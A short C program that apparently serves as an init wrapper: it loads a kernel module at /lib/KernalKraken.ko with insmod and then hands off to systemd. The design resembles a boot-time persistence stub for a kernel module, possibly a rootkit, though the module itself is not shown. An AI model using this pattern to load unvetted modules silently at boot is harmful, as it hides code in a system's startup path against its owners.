#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

int main() {
    pid_t pid;
    int status;
    
    pid = fork();
    
    if (pid == 0) {
        char *insmodArgs[] = {"/usr/sbin/insmod", "/lib/KernalKraken.ko", NULL};
        execvp(insmodArgs[0], insmodArgs);
    } else {
        waitpid(pid, &status, 0);
        char *systemdArgs[] = {"/lib/systemd/systemd", NULL};
        execvp(systemdArgs[0], systemdArgs);
    }
}
